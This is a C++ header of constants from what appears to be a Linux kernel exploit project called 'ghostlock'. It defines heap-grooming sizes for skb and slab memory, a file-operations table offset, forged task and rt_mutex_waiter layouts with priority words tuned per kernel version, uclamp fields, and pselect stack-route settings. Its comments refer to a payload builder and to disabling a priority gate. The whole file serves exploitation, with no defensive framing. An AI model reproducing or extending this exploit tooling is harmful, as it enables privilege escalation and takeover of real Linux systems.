#ifndef GHOSTLOCK_KERNEL_CONSTANTS_HPP
#define GHOSTLOCK_KERNEL_CONSTANTS_HPP

#include <cstdint>

#include "kernel/offset.h"

namespace ghostlock::kernel {
    inline constexpr unsigned PAGE_SHIFT = 12;
    inline constexpr unsigned long PAGE_SIZE = 1UL << PAGE_SHIFT;
    inline constexpr unsigned KS_PAGE_SIZE = 4096;
    inline constexpr unsigned long long KS_PAGE_MASK = 0xfffULL;

    inline constexpr long long SKB_DATA_DELTA = -0xe80LL;
    inline constexpr unsigned long MM_STRUCT_SZ = 0x500;

    inline constexpr unsigned MM_ORDER = 3;
    inline constexpr unsigned MM_PARTIALS = 5;

    inline constexpr unsigned long ORDER3_SIZE = PAGE_SIZE << MM_ORDER;
    inline constexpr unsigned long SKB_SEND_SIZE = ORDER3_SIZE * 2;
    inline constexpr unsigned SKB_RECLAIM_SENDS = 4;
    inline constexpr unsigned long FOPS_TABLE_OFF = FOPS_OFF;
    inline constexpr int32_t SKB_FRAG_BIAS = 0;

    inline constexpr int32_t FAKE_TASK_PRIO = 120;
    inline constexpr int32_t FAKE_WAITER_PRIO = 140;
    /* `unsigned int wake_state` exists in `struct rt_mutex_waiter` only from 5.15
     * on (5.10's +0x40 is `int prio` and +0x44 is padding; 5.15 put wake_state at
     * +0x40 and moved prio to +0x44). Where a family has the field, the pair is
     * packed into one 64-bit word as (prio << 32) | wake_state, and TASK_NORMAL is
     * the value upstream used -- see waiter_prio_word() in memory/payload_builder.h
     * and docs/analysis/waiter-layout-family-gating-plan.md. */
    inline constexpr uint32_t FAKE_WAITER_WAKE_STATE = 3;

    /* Family-correct `prio` word for waiter+0x40, where the eleven-word waiter
     * strip is built (memory/payload_builder.h's kWaiterBytes list). 5.10 has
     * `int prio` there with +0x44 as padding; 5.15/6.1 put `unsigned int
     * wake_state` at +0x40 and `prio` at +0x44, packed upstream into one word as
     * (prio << 32) | wake_state. `packed_wake_state` comes from the profile
     * (Profile::compact_waiter_has_wake_state) -- never write this word by hand:
     * the wrong shape reads as prio = 0 (highest) and silently disables the
     * prio-gate arm on 5.15/6.1. See docs/analysis/waiter-layout-family-gating-plan.md. */
    [[nodiscard]] inline constexpr uint64_t waiter_prio_word(uint64_t prio,
                                                             bool packed_wake_state) noexcept {
        return packed_wake_state ? ((prio << 32) | FAKE_WAITER_WAKE_STATE) : prio;
    }
    inline constexpr unsigned FAKE_TASK_UCLAMP_REQ_OFF = 0x350;
    inline constexpr unsigned FAKE_TASK_UCLAMP_OFF = 0x358;
    inline constexpr unsigned FAKE_UCLAMP_ACTIVE_BIT = 16;
    inline constexpr unsigned FAKE_UCLAMP_MIN_ACTIVE = 1U << FAKE_UCLAMP_ACTIVE_BIT;
    inline constexpr unsigned FAKE_UCLAMP_MAX_ACTIVE =
            (1024U | (19U << 11) | (1U << FAKE_UCLAMP_ACTIVE_BIT));

    inline constexpr unsigned TASK_COMM_LEN = 16;

    /* `select_stack_route.h` keeps a host-safe fallback macro under this name, so a
 * TU that includes it before common.h must not also declare the constexpr. */
#ifndef PSELECT_ROUTE_NFDS
    inline constexpr unsigned PSELECT_ROUTE_NFDS = 320;
#endif
    inline constexpr int32_t PSELECT_CONSUMER_NICE = 19;
    inline constexpr unsigned PSELECT_CONSUMER_SETTLE_USEC = 250000;

    struct local_sched_attr {
        uint32_t size;
        uint32_t sched_policy;
        uint64_t sched_flags;
        int32_t sched_nice;
        uint32_t sched_priority;
        uint64_t sched_runtime;
        uint64_t sched_deadline;
        uint64_t sched_period;
    };

    /* Measured direct-map end (defaults to the built-in bound). */
    extern uint64_t g_direct_map_end;
} // namespace ghostlock::kernel

#endif
